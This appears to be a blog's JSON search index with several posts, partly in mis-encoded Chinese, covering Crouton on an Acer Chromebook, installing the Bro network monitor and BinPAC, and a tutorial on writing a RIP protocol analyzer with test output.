æ³¨ï¼šxenialä¸ºubuntuçš„ç‰ˆæœ¬åç§°ï¼Œå³16.04ä¸ºxenial\næ¢å¤\nsudo sh ~/Downloads/crouton -f ~/Downloads/*.tar.gz æ³¨ï¼šå°†*.tar.gzæ”¹ä¸ºä½ çš„å¤‡ä»½æ–‡ä»¶åã€‚\nåˆ é™¤å¤‡ä»½\nsudo edit-chroot -d xenial è§£å†³éŸ³é¢‘çš„Bugé—®é¢˜ æš‚æ—¶æ²¡æœ‰è§£å†³(é—ç•™) ç½‘ä¸Šè§£å†³æ–¹æ¡ˆ(æœªåœ¨æˆ‘çš„Chromebookä¸Šé¢æˆåŠŸ)ï¼š\nåœ¨Chrome OSä¸­shift+alt+Tè°ƒå‡ºcroshçª—å£ï¼Œè¾“å…¥shellã€‚ è¾“å…¥sudo enter-chroot -n trusty è¾“å…¥sudo apt-get dist-upgrade Ctrl+Dç™»å‡º è¾“å…¥sudo sh -e ~/Downloads/crouton-master/installer/main.sh(ä¸‹è½½çš„å“ªä¸ªæ–‡ä»¶ç”¨å“ªä¸ªæ–‡ä»¶åï¼‰ -u -n xenial ç­‰å¾…æ›´æ–°å®Œæˆã€‚ä¸€èˆ¬å‡ºç°çš„æ— å£°éŸ³ã€ä¸èƒ½æ’­æ”¾è§†é¢‘ç­‰BUGéƒ½å¯ä»¥è§£å†³ã€‚ æ³¨ï¼šxenialä¸ºç‰ˆæœ¬å·ï¼Œä½ ä½¿ç”¨å“ªä¸ªç‰ˆæœ¬å¡«å†™å“ªä¸ªç‰ˆæœ¬å·x croutonè¿›é˜¶æ“ä½œ åœ¨Chromebooké‡Œé¢çš„chromeä¸­ä»¥çª—å£çš„æ–¹å¼è¿è¡ŒUbuntu å…ˆåœ¨Chromebookçš„chrome ç½‘ä¸Šåº”ç”¨å•†åº—é‡Œä¸‹è½½ cronton-integration ç„¶ååœ¨croshä¸­ï¼Œå®‰è£…xiwiæ¡Œé¢\nsudo sh ~/Downloads/crouton -t unity,extension,xorg,xiwi //æˆ‘æ˜¯åœ¨ xfce æ¡Œé¢ä¸‹ä½¿ç”¨çš„ unity ä¹Ÿå¯è¡Œ ä½†è¦æ±‚ä¸‹è½½ extension,xorg,xiwi sudo startxunity -X xiwi // ä½¿ç”¨ xiwi æ¥å®ç° çª—å£åŒ– ä½¿ç”¨ä¸­é‡åˆ°çš„é—®é¢˜ Wifiå¼€å…³æ— æ³•å¼€å¯çš„é—®é¢˜ é—®é¢˜æè¿°ï¼šåœ¨Chrome OSç³»ç»Ÿä¸­ï¼Œå½“ä¼‘çœ çŠ¶æ€æ¢å¤ä¹‹åï¼Œå‡ºç°è¿‡Wifiæ— æ³•è¿æ¥ï¼Œç³»ç»Ÿçš„WifiçŠ¶æ€æ˜¯å…³é—­çš„ï¼Œå³ä½¿ç‚¹å‡»çš„å¼€å¯çš„æŒ‰é’®ï¼Œä½†æ˜¯åœ¨ä¸‰åˆ°äº”ç§’ä¹‹åå°±ä¼šè‡ªåŠ¨å…³é—­ã€‚ è§£å†³æ–¹æ¡ˆï¼šç»è¿‡è‡ªå·±æ£€æŸ¥ï¼Œå‘ç°æ˜¯Wifiæ¨¡å—æœ‰ä¸€äº›æ¾åŠ¨ï¼Œæ‰€ä»¥æ‹†æœºä¹‹åï¼Œé‡æ–°å›ºå®šäº†Wifiæ¨¡å—å°±å¯ä»¥ä½¿ç”¨äº†ã€‚\n","date":1527712232,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1527712232,"objectID":"63892f1d7c2b1cf683a920a514614563","permalink":"http://www.guozet.me/post/Acer-Chromebook-R11/","publishdate":"2018-05-30T20:30:32Z","relpermalink":"/post/Acer-Chromebook-R11/","section":"post","summary":"å‰è¨€ ä¹‹å‰ä½¿ç”¨äº†ä¸¤å¹´çš„MSI GE60 2PG ç¬”è®°æœ¬æ•£çƒ­é—®é¢˜è¶Šæ¥è¶Šä¸¥é‡ï¼Œå¯¼è‡´é£æ‰‡æ°¸è¿œè½¬åˆ°æœ€é«˜è½¬é€Ÿï¼Œå¦åˆ™CPUæ¸©åº¦ä¸€ç›´æ— æ³•é™ä¸‹æ¥ã€‚ä½†æ˜¯ï¼Œé£æ‰‡è½¬åˆ°æœ€é«˜è½¬é€Ÿï¼Œè¿™å°ç”µè„‘äº§ç”Ÿçš„å™ªéŸ³ä¼šéå¸¸å¤§ï¼Œå¦‚æœå’‹å›¾ä¹¦é¦†æˆ–è€…å®éªŒå®¤ä½¿ç”¨ï¼Œå¾ˆå®¹æ˜“å°±å½±å“åˆ°å‘¨å›´å­¦ä¹ çš„å…¶ä»–åŒå­¦äº†ï¼Œäºæ˜¯è€ƒè™‘åˆ°éƒ½ä¹°å¦å¤–ä¸€ä¸ªè½»ä¾¿çš„ï¼Œå¾…æœºæ—¶é—´æ¯”è¾ƒé•¿çš„ç¬”è®°æœ¬åˆ°å­¦æ ¡ï¼Œèƒ½å¤Ÿæ”¯æŒè‡ªå·±çš„å¸¸è§„ä½¿ç”¨ã€‚\n","tags":"Chromebook","title":"Acer Chromebook R11 ChromeOS ä½¿ç”¨æ‰‹å†Œ(å‘)","type":"post"},{"authors":null,"categories":"Project","content":"Introduce The best way to understand the structure of the sources code is to write some modules by yourself. Let\u0026rsquo;s us to write an Analyzer in the Bro by Binpac. We choose RIP v2 to write the first protocol.\nHow to Use Binpac quick start to create the relative file to develop an analyzer? Download Binpac Quick Start git clone https://github.com/grigorescu/binpac_quickstart.git When you finish download, you can enter the binpac_quickstart directory, then you will find there are some files in this directory as blow.\nGuoze@node-0:~/00_Workbench$ cd binpac_quickstart/\rGuoze@node-0:~/00_Workbench/binpac_quickstart$ ls -al\rtotal 32\rdrwxr-xr-x 4 Guoze senfv-PG0 4096 May 22 19:30 .\rdrwxr-xr-x 11 Guoze senfv-PG0 4096 May 23 12:15 ..\rdrwxr-xr-x 8 Guoze senfv-PG0 4096 May 22 19:30 .git\r-rw-r--r-- 1 Guoze senfv-PG0 21 May 22 19:30 __init__.py\r-rw-r--r-- 1 Guoze senfv-PG0 128 May 22 19:30 README.md\r-rwxr-xr-x 1 Guoze senfv-PG0 7151 May 22 19:30 start.py\rdrwxr-xr-x 2 Guoze senfv-PG0 4096 May 22 19:30 templates\rUser start.pyto create the directory structure in Bro start.py is the script which who can use to build a directory structure to develp the RIP analyzer. We can use this script as following.\nGuoze@node-0:~/00_Workbench/binpac_quickstart$ ./start.py Usage:\rstart.py NAME DESCRIPTION PATH_TO_BRO_SRC (--tcp|--udp) [--buffered] [--plugin]\rExample: ./start.py RIP \u0026quot;Routing Internet Protocl\u0026quot; ../bro --udp Procotol nameï¼šRIPï¼› Procoto descriptionï¼šRouting Internet Protocl The absolute path of the Bro source codeï¼š../bro The type of Network Portocol which the RIP useï¼š\u0026ndash;udp\nUse this script to built RIP work directory in the Bro source code file. If you don\u0026rsquo;t know RIP protocol before, please read the RIP protocol documents.\nIn the terminal, we just need to input the command as follows to create our work directory. ./start.py RIP \u0026quot;Routing Internet Protocl\u0026quot; ../bro --udp\nAfter complete, It will create some files in the bro/scripts/base/protocols/rip/ directory and bro/src/analyzer/protocol/rip/ directory\nbro/scripts/base/protocols/rip/ Guoze@node-0:~/00_Workbench/bro/scripts/base/protocols/rip$ ls -l\rtotal 12\r-rw-r--r-- 1 Guoze senfv-PG0 245 May 23 12:49 dpd.sig\r-rw-r--r-- 1 Guoze senfv-PG0 66 May 23 12:49 __load__.bro\r-rw-r--r-- 1 Guoze senfv-PG0 1327 May 23 12:49 main.bro\r__load__.bro: This allows all the contents of the directory to be loaded via @load base/protocols/sip. dpd.sig: This file contains a signature that can be used to attach the analyzer to connections if their content matches. main.bro: Contains the base script-layer functionality for processing events emitted from the analyzer.\nsrc/analyzer/protocol/sip/ Guoze@node-0:~/00_Workbench/bro/src/analyzer/protocol/rip$ ls -l\rtotal 32\r-rw-r--r-- 1 Guoze senfv-PG0 301 May 23 12:50 CMakeLists.txt\r-rw-r--r-- 1 Guoze senfv-PG0 472 May 23 12:50 events.bif\r-rw-r--r-- 1 Guoze senfv-PG0 480 May 23 12:50 Plugin.cc\r-rw-r--r-- 1 Guoze senfv-PG0 738 May 23 15:27 rip-analyzer.pac\r-rw-r--r-- 1 Guoze senfv-PG0 721 May 23 12:50 RIP.cc\r-rw-r--r-- 1 Guoze senfv-PG0 715 May 23 12:50 RIP.h\r-rw-r--r-- 1 Guoze senfv-PG0 1005 May 23 12:50 rip.pac\r-rw-r--r-- 1 Guoze senfv-PG0 939 May 23 15:03 rip-protocol.pac\rCMakeLists.txt: Informs the CMake build system how to compile the analyzer. Plugin.cc: Analyzers in Bro are a type of plugin. This file does whatâ€™s necessary to register the new analyzer plugin with Bro. RIP.h: Defines the API for the new analyzer which derives from one of Broâ€™s already-existing analyzer classes. RIP.cc: Implementation of the analyzer. Itâ€™s mostly just responsible for handing off data to the protocol parser thatâ€™s been generated by BinPAC. events.bif: Defines events that the analyzer will generate. rip.pac: The main entry point for the BinPAC definition of the protocol that you want to parse. rip-protocol.pac: Where the message format is defined.\nrip-analyzer.pac: Defines a connection, flow, and other processing functions for the analyzer.\nIf you just want to use Binpac to compile your c++ file, you just need to write these files:\nevents.bif rip.pac rip-protocol.pac rip-analyzer.pac Implementation Implement the rip-protocol.pac file This file just defines each part in the RIP protocol. In the code, you will find the Binpac language use keywords type to express a data structure in the RIP protocol. The RIP_PDUfuntion which is the lastest type in this file defines the data structure which user want to transfer when the RIP event happens.\nThe RIP packet format is:\n0 1 2 3\r0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| command (1) | version (1) | must be zero (2) |\r+---------------+---------------+-------------------------------+\r| |\r~ RIP Entry (20) ~\r| |\r+---------------+---------------+---------------+---------------+\rThere may be between 1 and 25 (inclusive) RIP entries. A RIP-1 entry has the following format:\n0 1 2 3\r0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| address family identifier (2) | must be zero (2) |\r+-------------------------------+-------------------------------+\r| IPv4 address (4) |\r+---------------------------------------------------------------+\r| must be zero (4) |\r+---------------------------------------------------------------+\r| must be zero (4) |\r+---------------------------------------------------------------+\r| metric (4) |\r+---------------------------------------------------------------+\rUse this file to design the protocol structures of RIP in our case. Just take the structures from the protocol and write the code in this file to parse it.\nProtocol Extensions\rRIP-2 is:\r0 1 2 3 3\r0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| Address Family Identifier (2) | Route Tag (2) |\r+-------------------------------+-------------------------------+\r| IP Address (4) |\r+---------------------------------------------------------------+\r| Subnet Mask (4) |\r+---------------------------------------------------------------+\r| Next Hop (4) |\r+---------------------------------------------------------------+\r| Metric (4) |\r+---------------------------------------------------------------+\rThe Address Family Identifier, IP Address, and Metric all have the meanings defined in section 3.4. The Version field will specify\n1 # Generated by binpac_quickstart 1 2 # ## TODO: Add your protocol structures in here. 3 # ## some examples: 4 5 # Types are your basic building blocks. 6 # There are some builtins, or you can define your own. 7 # Here's a definition for a regular expression: 8 # type RIP_WHITESPACE = RE/[ \\t]*/; 9 10 # A record is a collection of types. 11 # Here's one with the built-in types 12 13 enum Rip_Command { 14 RIP_REQUEST = 1, 15 RIP_RESPONSE = 2, 16 } 17 18 enum Rip_Version { 19 RIP_V1 = 1, 20 RIP_V2 = 2, 21 } 22 23 type Rip_Message = record { //Base Message 24 command : uint8; 25 version : uint8; 26 pad : padding[2]; //must be zero 27 entry : Rip_Entry[] \u0026amp;until($input.length()) == 0; 28 }; 29 30 type Rip_Entry = record {\r31 af : uint16; 32 rt : uint16; 33 ip : uint32; 34 mask : uint32; 35 gateway : uint32; 36 metric : uint32; 37 }; 38 39 type RIP_PDU(is_orig: bool) = record { 40 command : uint8; 41 version : uint8; 42 pad : padding[2]; 43 } \u0026amp;byteorder=bigendian; RIP_PDU structure: pass to the user land, just focus which you want to pass.\nImplement the rip_analyzer.pac file This file mainly finishes the processing and analyzing of the data which was passed by the RIP_PDU function to this file. If there is a RIP event happens, then it enters this processing flow.\nThe BifEvent::generate_rip_request function illustrates how to generate an request event. We use this event to pass the data structure which is important in the next process (the data structure created in rip_protocol.pac). The main thing we need to define is what we want to pass. Such as: msg.command, msg.version\n%code{ \u0026hellip; %} : Copy C++ code to the generated source file\n1 # Generated by binpac_quickstart 1 2 refine flow RIP_Flow += { 3 function proc_rip_message(msg: RIP_PDU): bool 4 %{ 5 // Check for RIP commands 6 if ( ${msg.command} == RIP_REQUEST) { 7 BifEvent::generate_rip_request(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(),\r8 ${msg.command}, //Pass more thing 9 ${msg.version}); 10 return true; 11 } 12 if ( ${msg.command} == RIP_RESPONSE) { 13 BifEvent::generate_rip_response(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(), 14 ${msg.command}, 15 ${msg.version}); 16 return true; 17 } 18 %} 19 }; 20 21 refine typeattr RIP_PDU += \u0026amp;let { 22 proc: bool = $context.flow.proc_rip_message(this); 23 }; ~\rfunction proc_rip_message(msg: RIP_PDU): bool just like to say please use that RIP_PDU data structure that was defined in the earlier file.\nImplement the events.bif file 1 # Generated by binpac_quickstart 1 2 # In this file, you'll define the events that your analyzer will 3 # generate. A sample event is included. 4 5 # ## TODO: Edit the sample event, and add more events. 6 7 ## Generated for RIP connections 8 ## 9 ## See `Google \u0026lt;http://lmgtfy.com/?q=RIP\u0026gt;`__ for more information about RIP 10 ## 11 ## c: The connection 12 ## 13 event rip_request%(c: connection, command: count, version: count%); 14 event rip_response%(c: connection, command: count, version: count%);\rRIP just have two types of command:\nrip_request rip_response Test Configure Bro\u0026rsquo;s Working Environment Firstly, we need to configure the bro\u0026rsquo;s path to execute it. The executable path of the Bro is bro/build/src/bro.\nGuoze@node-0:~/00_Workbench/bro$ ./build/src/bro -h\rbro version 2.5-598\rusage: ./build/src/bro [options] [file ...]\r\u0026lt;file\u0026gt; | policy file, or read stdin\r-a|--parse-only | exit immediately after parsing scripts\r-b|--bare-mode | don't load scripts from the base/ directory\r-d|--debug-policy | activate policy file debugging\r-e|--exec \u0026lt;bro code\u0026gt; | augment loaded policies by given code\r-f|--filter \u0026lt;filter\u0026gt; | tcpdump filter\rBro has provided an executable script for you. As a result, you can easily configure environment variables. We just need to execute the configuration script. Use the shell script for configuring environment variables is as follows:\nGuoze@node-0:~/00_Workbench/bro/build$ cat bro-path-dev.sh export BROPATH=`/users/Guoze/00_Workbench/bro/build/bro-path-dev`\rexport BRO_PLUGIN_PATH=\u0026quot;/users/Guoze/00_Workbench/bro/build/src\u0026quot;:\rexport PATH=\u0026quot;/users/Guoze/00_Workbench/bro/build/src\u0026quot;:$PATH\rGuoze@node-0:~/00_Workbench/bro$ source ./build/bro-path-dev.sh\rIf you want to check the execution status of the script and determine whether it has completed the configuration, you can enter: bro -hin the terminal. If the execution result is as same as the result of ./build/src/bro -h, then it means that the configuration has been configured successfully.\nGuoze@node-0:~/00_Workbench/bro$ bro -h\rbro version 2.5-598\rusage: bro [options] [file ...]\r\u0026lt;file\u0026gt; | policy file, or read stdin\r-a|--parse-only | exit immediately after parsing scripts\r-b|--bare-mode | don't load scripts from the base/ directory\r-d|--debug-policy | activate policy file debugging\r-e|--exec \u0026lt;bro code\u0026gt; | augment loaded policies by given code\r-f|--filter \u0026lt;filter\u0026gt; | tcpdump filter\r-g|--dump-config | dump current config into .state dir\r-h|--help|-? | command line help\rTest RIP parser Download RIP Network data We can directly download a RIPv2 packet which can be used for testing on Internet. $ wget http://packetlife.net/captures/RIPv2.cap\nAfter download, use the command \u0026rsquo;tcpdump\u0026rsquo; to determine whether the data packet contains RIP data.\nGuoze@node-0:~/00_Workbench$ tcpdump -nr RIPv2.cap\rreading from file RIPv2.cap, link-type EN10MB (Ethernet)\r23:06:26.942558 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:06:30.158769 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:06:52.663855 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:06:58.416478 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:19.709681 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:24.974047 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:45.389720 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:53.891896 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:14.625084 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:21.933550 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:41.410659 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:47.731064 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\rAdd some print information 12 refine flow RIP_Flow += { 11 function proc_rip_message(msg: RIP_PDU): bool\r10 %{ 9 // Check for RIP commands 8 if ( ${msg.command} == RIP_REQUEST) { 7 printf(\u0026quot;In rip_request\\n\u0026quot;);\r6 BifEvent::generate_rip_request(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(),\r5 ${msg.command}, 4 ${msg.version}); 3 return true; 2 } 1 if ( ${msg.command} == RIP_RESPONSE) {\r15 printf(\u0026quot;In rip_response\\n\u0026quot;); 1 BifEvent::generate_rip_response(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(),\r2 ${msg.command}, 3 ${msg.version}); 4 return true; 5 } 6 %}\rAfter change, make the code again.\nGuoze@node-0:~/00_Workbench/bro$ sudo make\rmake -C build all\rmake[1]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[2]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[3]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\r........\r........\r[100%] Built target rst\rmake[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rmake[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rUse Network Capture Data for Testing Guoze@node-0:~/00_Workbench$ bro -r RIPv2.cap In rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\r","date":1527193832,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1527193832,"objectID":"0bd9868fe0189d43231d7cfc6eef555d","permalink":"http://www.guozet.me/post/Write-your-first-Analyzer-en/","publishdate":"2018-05-24T20:30:32Z","relpermalink":"/post/Write-your-first-Analyzer-en/","section":"post","summary":"Introduce The best way to understand the structure of the sources code is to write some modules by yourself. Let\u0026rsquo;s us to write an Analyzer in the Bro by Binpac. We choose RIP v2 to write the first protocol.\n","tags":"Network","title":"Complete your first analyzer - RIP in bro","type":"post"},{"authors":null,"categories":"Network","content":"å‰è¨€ ï»¿Bro is a powerful network analysis framework that is much different from the typical IDS you may know.\nBinPAC is a high level language for describing protocol parsers and generates C++ code. It is currently maintained and distributed with the Bro Network Security Monitor distribution, however, the generated parsers may be used with other programs besides Bro.\nè½¯ä»¶å®‰è£… å®‰è£…Bro å‰æœŸä¾èµ–åŒ…å®‰è£… Bro requires the following libraries and tools to be installed before you begin:\nLibpcap ( http://www.tcpdump.org) OpenSSL libraries ( http://www.openssl.org) BIND8 library Libz Bash (for BroControl) Python 2.6 or greater (for BroControl) To build Bro from source, the following additional dependencies are required:\nCMake 2.8 or greater ( http://www.cmake.org) Make C/C++ compiler with C++11 support (GCC 4.8+ or Clang 3.3+) SWIG ( http://www.swig.org) Bison (GNU Parser Generator) Flex (Fast Lexical Analyzer) Libpcap headers ( http://www.tcpdump.org) OpenSSL headers ( http://www.openssl.org) zlib headers Python To install the required dependencies, you can use:\nDEB/Debian-based Linux: sudo apt-get install cmake make gcc g++ flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev\rInstalling from Source Bro releases are bundled into source packages for convenience and are available on the bro downloads page.\nAlternatively, the latest Bro development version can be obtained through git repositories hosted at git.bro.org. See their git development documentation.\ngit clone --recursive git://git.bro.org/bro\rcd bro\rsudo su\r./configure\rmake\rmake install\ré…ç½®ç¯å¢ƒå˜é‡ export PATH=/usr/local/bro/bin:$PATH\næ³¨æ„ï¼šç”±äºExportçš„æ–¹å¼ï¼Œåªæ˜¯åœ¨æœ¬æ¬¡ç™»å½•shçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆæœçš„ï¼Œæ‰€ä»¥åç»­éœ€è¦é‡æ–°é…ç½®\nå®‰è£…Binpac ä¾èµ–åŒ…æ–‡ä»¶ BinPAC relies on the following libraries and tools, which need to be installed before you begin:\nFlex (Fast Lexical Analyzer) Flex is already installed on most systems, so with luck you can skip having to install it yourself.\nBison (GNU Parser Generator)\nBison is also already installed on many system.\nCMake 2.6.3 or greater\nCMake is a cross-platform, open-source build system, typically not installed by default. See http://www.cmake.org for more information regarding CMake and the installation steps below for how to use it to build this distribution. CMake generates native Makefiles that depend on GNU Make by default\nInstalling from Source To build and install into /usr/local:\ngit clone --recursive git@github.com:bro/binpac.git\rcd binpac\r./configure\rcd build\rmake\rsudo make install\rThis will perform an out-of-source build into the build directory using the default build options and then install the binpac binary into /usr/local/bin.\nYou can specify a different installation directory with:\n./configure \u0026ndash;prefix=\nRun ./configure --help for more options.\nä¸‹è½½ BinPAC Sample Analyzer è¿™ä¸ªæ˜¯ä¸€ä¸ªpythonè„šæœ¬ï¼Œèƒ½å¤ŸæŒ‰ç…§broçš„è§„åˆ™ç”Ÿæˆå‡ºBinpacéœ€è¦ä¹¦å†™çš„æ–‡ä»¶ï¼Œç”Ÿæˆå‡ºæ¥ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦å¡«å†™è¿™äº›æ–‡ä»¶å°±å¯ä»¥äº†ã€‚\nInstalling from Source ä»Githubä¸Šé¢æ‹·è´ä¾‹å­çš„æ–‡ä»¶ä¸‹æ¥ git clone https://github.com/grigorescu/binpac_quickstart Inside the binpac_quickstart directory, simply run:\npython start.py Sample \u0026quot;Sample Protocol\u0026quot; ../bro --tcp --buffered\nThis will generate all the necessary files for this sample analyzer. The ../bro argument here just points to the Bro source tree. Make sure to change it if yours lives in a different location. See the start.py â€”helpoptions for more explanation of the options.\nBro should be able to compile the generated template code right away, but files may have some â€œTODOâ€ comments in them to mark places that typically need to be changed depending on the specifics of the protocol analyzer you want to make.\né‡åˆ°çš„é—®é¢˜ ä¹¦å†™Analyzeræ—¶å€™é‡åˆ°çš„é—®é¢˜ Broå®‰è£…è¿‡ç¨‹ä¸­é‡åˆ°çš„é”™è¯¯ é”™è¯¯1 ./configureé”™è¯¯ bro# ./configure --with-pcap=/opt/pfring Build Directory : build Source Directory: /root/install/bro CMake Error at CMakeLists.txt:7 (include): include could not find load file:\rcmake/CommonCMakeConfig.cmake\rCMake Error at CMakeLists.txt:52 (include): include could not find load file:\rFindRequiredPackage\râ€“ Found sed: /bin/sed CMake Error at CMakeLists.txt:64 (FindRequiredPackage): Unknown CMake command \u0026quot;FindRequiredPackage\u0026quot;.\râ€“ Configuring incomplete, errors occurred! See also \u0026quot;/root/install/bro/build/CMakeFiles/CMakeOutput.log\u0026quot;.\rè§£å†³æ–¹æ¡ˆï¼š å…‹éš†çš„æ—¶å€™éœ€è¦æ·»åŠ \u0026ndash;recursiveå‚æ•°ï¼Œä¿è¯è‡ªå·±ä¸‹è½½çš„å­æ¨¡å— git clone --recursive git://git.bro.org/bro\nç¼–è¯‘è‡ªå·±ä¹¦å†™çš„Analyzeræ—¶å€™çš„é—®é¢˜ é”™è¯¯1 make[3]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[3]: *** No rule to make target '../src/binpac', needed by 'src/binpac-lib_pac.h'. Stop.\rmake[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rCMakeFiles/Makefile2:946: recipe for target 'src/CMakeFiles/pac-binpac-lib.pac.dir/all' failed\rmake[2]: *** [src/CMakeFiles/pac-binpac-lib.pac.dir/all] Error 2\rmake[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rMakefile:138: recipe for target 'all' failed\rmake[1]: *** [all] Error 2\rmake[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rMakefile:15: recipe for target 'all' failed\rmake: *** [all] Error 2\rè§£å†³æ–¹æ¡ˆï¼š è¿™ä¸ªé”™è¯¯å¾ˆå¤§å¯èƒ½æ€§æ˜¯ä½ ä½¿ç”¨äº†åœ¨è¯¥æ–‡ä»¶ç›®å½•ä¸‹æ²¡æœ‰æƒé™ï¼ŒåŠ å…¥sudo make\né”™è¯¯2 [ 1%] Completed 'project_caf'\rmake[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\r[ 2%] Built target project_caf\rmake[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rMakefile:138: recipe for target 'all' failed\rmake[1]: *** [all] Error 2\rmake[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rMakefile:15: recipe for target 'all' failed\rmake: *** [all] Error 2\rè§£å†³æ–¹æ¡ˆï¼š è¿™ä¸ªé”™è¯¯å¾ˆå¤§å¯èƒ½æ€§æ˜¯ä½ ä½¿ç”¨äº†make -j 4å¤šæ ¸ç¼–è¯‘çš„æ–¹å¼å¯¼è‡´çš„ï¼Œå–æ¶ˆå¤šæ ¸ç¼–è¯‘ï¼Œä»…ä»…ä½¿ç”¨make\n","date":1527168632,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1527168632,"objectID":"71df8a9302dc0fe23fb4ef44c3c4b9e8","permalink":"http://www.guozet.me/post/Install-bro-Binpac/","publishdate":"2018-05-24T13:30:32Z","relpermalink":"/post/Install-bro-Binpac/","section":"post","summary":"å‰è¨€ ï»¿Bro is a powerful network analysis framework that is much different from the typical IDS you may know.\nBinPAC is a high level language for describing protocol parsers and generates C++ code. It is currently maintained and distributed with the Bro Network Security Monitor distribution, however, the generated parsers may be used with other programs besides Bro.\n","tags":"Network","title":"Ubuntu 16.04å®‰è£…broå’ŒBinpac","type":"post"},{"authors":null,"categories":"Project","content":"å‰è¨€ ç†Ÿæ‚‰ä»£ç ç»“æ„æœ€å¥½çš„æ–¹å¼ï¼Œå°±æ˜¯å°è¯•è‡ªå·±å»å†™ä¸€ä¸ªæ¨¡å—åŠ å…¥åˆ°æ•´ä¸ªç³»ç»Ÿä¸­ï¼Œåœ¨è°ƒè¯•ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œç†Ÿæ‚‰ä»£ç ã€‚\nå®ç°æµç¨‹ ä½¿ç”¨Binpac quick startè„šæœ¬ç”Ÿæˆè‡ªå·±çš„Analyzerç›®å½•ç»“æ„ ä¸‹è½½Binpac Quick Startè„šæœ¬ git clone https://github.com/grigorescu/binpac_quickstart.git ä¸‹è½½å®Œæˆä¹‹åï¼Œè¿›å…¥è¯¥ç›®å½•ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤º:\nGuoze@node-0:~/00_Workbench$ cd binpac_quickstart/\rGuoze@node-0:~/00_Workbench/binpac_quickstart$ ls -al\rtotal 32\rdrwxr-xr-x 4 Guoze senfv-PG0 4096 May 22 19:30 .\rdrwxr-xr-x 11 Guoze senfv-PG0 4096 May 23 12:15 ..\rdrwxr-xr-x 8 Guoze senfv-PG0 4096 May 22 19:30 .git\r-rw-r--r-- 1 Guoze senfv-PG0 21 May 22 19:30 __init__.py\r-rw-r--r-- 1 Guoze senfv-PG0 128 May 22 19:30 README.md\r-rwxr-xr-x 1 Guoze senfv-PG0 7151 May 22 19:30 start.py\rdrwxr-xr-x 2 Guoze senfv-PG0 4096 May 22 19:30 templates\rä½¿ç”¨è„šæœ¬ç”Ÿäº§åˆ†æå™¨ç›®å½•ç»“æ„ start.pyçš„pythonå°±æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨æ¥ç”Ÿæˆbroä¸­Analyzerçš„pythonè„šæœ¬ï¼Œä½¿ç”¨æ–¹å¼ï¼š\nGuoze@node-0:~/00_Workbench/binpac_quickstart$ ./start.py Usage:\rstart.py NAME DESCRIPTION PATH_TO_BRO_SRC (--tcp|--udp) [--buffered] [--plugin]\rExample: ./start.py RIP \u0026quot;Routing Internet Protocl\u0026quot; ../bro --udp åè®®åç§°ï¼šRIPï¼› åè®®ä»‹ç»ï¼šRouting Internet Protocl Broæºä»£ç çš„è·¯å¾„ï¼š../bro 